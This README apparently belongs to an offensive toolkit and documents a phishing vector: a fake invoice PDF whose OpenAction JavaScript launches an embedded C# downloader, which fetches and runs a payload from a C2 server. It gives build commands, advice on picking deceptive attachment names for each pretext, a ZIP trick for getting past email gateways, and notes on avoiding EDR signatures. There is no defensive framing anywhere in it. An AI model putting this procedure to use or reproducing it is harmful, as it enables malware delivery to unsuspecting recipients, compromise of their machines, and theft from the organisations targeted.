# PDF Vector — OpenAction JavaScript Phishing

> **End-to-end build:** see [`../BUILD.md`](../BUILD.md) for the full
> walkthrough from clone to armed, tested payload.

## Files

- `payload.cs` — the C# launcher compiled into `payload.exe` and embedded in
  the PDF. Small downloader; invokes the same PowerShell cradle used by the
  DOC vector.
- `build_pdf_payload.py` — generates the malicious PDF from the compiled exe.

## How it works

1. User opens `Q4_Invoice.pdf` in Adobe Reader or Foxit Reader.
2. The `/OpenAction` JavaScript fires on open. It shows a benign alert
   ("Loading invoice viewer...") and calls `exportDataObject` on the embedded
   launcher with `nLaunch: 1`.
3. Adobe/Foxit prompts the user to open the embedded file. With the pretext in
   place, the prompt reads as routine.
4. The launcher runs, downloads `run.txt` from the C2, and executes it.
5. A visible page attachment icon on the PDF serves as a fallback if the user
   dismissed the JS prompt or if their reader has JavaScript disabled.

## Why the PDF vector

- No macro warning banner — the PDF is the delivery format, not a wrapper for
  macros.
- No "Enable Content" click required beyond the attachment prompt.
- Works against Office 2021 / Office 365 targets where macro execution is
  blocked.
- Browser PDF viewers (Chrome, Firefox) do not execute JavaScript in PDFs.
  Effective against Adobe Reader and Foxit Reader, which are the default PDF
  applications on most enterprise Windows images.

## Build steps

1. Compile the launcher:

       # Windows with .NET SDK / Framework
       csc /target:exe /platform:x64 /out:payload.exe payload.cs

       # Linux / WSL with Mono
       mcs -platform:x64 -out:payload.exe payload.cs

2. Generate the PDF:

       python3 build_pdf_payload.py \
           --exe payload.exe \
           --out Q4_Invoice.pdf \
           --name "Q4_Invoice_Update.exe"

## Embedded filename guidance

The `--name` argument is what the user sees in the "Open attachment?" prompt.
Match it to the pretext:

- Invoice pretext: `Q4_Invoice_Update.exe`
- Shipping pretext: `Shipping_Label_Viewer.exe`
- Secure document pretext: `SecureDoc_Viewer.exe`

Avoid names that look like generic malware (`update.exe`, `setup.exe`) —
those raise suspicion in the prompt.

## Delivery notes

- Deliver as a direct PDF attachment. PDFs are less commonly flagged by email
  gateways than `.docm` files.
- The password-protected ZIP trick works for PDFs too if the email gateway
  strips PDF attachments directly.
- The C2 must serve the same `run.txt` that the DOC vector uses.

## Limitations

- Does not execute under Chrome's built-in PDF viewer or Firefox's PDF.js.
- Hardened Adobe Reader installs (JS disabled via registry) block the
  OpenAction path — the visible attachment icon is the only fallback.
- Some EDR products flag the `exportDataObject` + `nLaunch` combination as a
  signature; the prompt-based approach (`nLaunch: 1`) is less likely to be
  blocked than silent launch (`nLaunch: 2`).

## Related

- `../BUILD.md` — end-to-end walkthrough
- `../shared/run_txt_recipe.md`
- `../shared/activate_poller.ps1`
- `../shared/handler.rc`
